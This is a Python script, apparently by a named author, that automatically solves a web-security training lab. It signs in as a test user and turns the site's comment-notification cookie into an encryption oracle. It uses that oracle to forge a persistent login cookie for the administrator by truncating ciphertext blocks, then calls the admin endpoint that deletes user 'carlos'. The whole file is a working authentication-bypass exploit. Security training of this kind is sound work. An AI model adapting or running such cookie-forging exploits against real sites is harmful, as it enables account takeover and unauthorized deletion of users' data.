import requests
import re
from urllib.parse import unquote_plus, quote_plus
import base64
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.email_client = None

    def get_csrf_token(self, path):
        response = self.session.get(self.lab_url + path)
        return re.search('name="csrf" value="(.*)"', response.text).group(1)

    def sign_in_as_wiener(self):
        data = {
            'csrf': self.get_csrf_token('login'),
            'username': 'wiener',
            'password': 'peter',
            'stay-logged-in': 'on'
        }

        self.session.post(self.lab_url + 'login', data=data)

    def decrypt_payload(self, string):
        self.session.cookies.set('notification', string)
        response = self.session.get(self.lab_url + 'post?postId=1')
        return re.findall(r'<header class="notification-header">\n +(.*) <', response.text)[0]

    def encrypt_payload(self, string):
        data = {
            'csrf': self.get_csrf_token('post?postId=1'),
            'postId': 1,
            'comment': 'hacker',
            'name': 'hacker',
            'email': string,
            'website': 'https://'
        }

        response = self.session.post(self.lab_url + 'post/comment', data=data, allow_redirects=False)
        return response.cookies.get('notification')

    def get_session_for_administrator_and_delete_carlos(self):
        timestamp = self.decrypt_payload(self.session.cookies.get('stay-logged-in')).split(':')[1]
        token_base64_encoded = unquote_plus(self.encrypt_payload('xxxxxxxxxadministrator:' + timestamp))
        byte_string = base64.b64decode(token_base64_encoded)
        byte_list = ','.join(f'{byte:02x}' for byte in byte_string).split(',')
        new_byte_list = bytes.fromhex(''.join(byte_list[32:]))
        self.session.cookies.pop('session')
        self.session.cookies.pop('stay-logged-in')
        self.session.cookies.set('stay-logged-in', quote_plus(base64.b64encode(new_byte_list).decode('utf-8')))
        self.session.get(self.lab_url + 'admin/delete?username=carlos')

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.sign_in_as_wiener()
        self.get_session_for_administrator_and_delete_carlos()
        self.checking_solution()


lab_solver = LabSolver(sys.argv[1])
lab_solver.solve()
